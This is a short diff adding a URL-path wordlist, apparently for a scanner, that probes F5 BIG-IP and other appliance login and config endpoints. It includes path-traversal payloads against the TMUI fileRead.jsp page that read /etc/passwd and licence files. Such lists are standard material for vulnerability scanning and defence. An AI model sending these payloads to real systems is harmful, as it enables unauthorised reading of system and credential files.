@@ -1,0 +1,11 @@
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
+/hsqldb%0a
+/mgmt/shared/authn/login
+/tmui/login.jsp
+/gui/login
+/pre/config.php?version=2.0
+/pre/config.php?version=3.0
+
+/my.policy
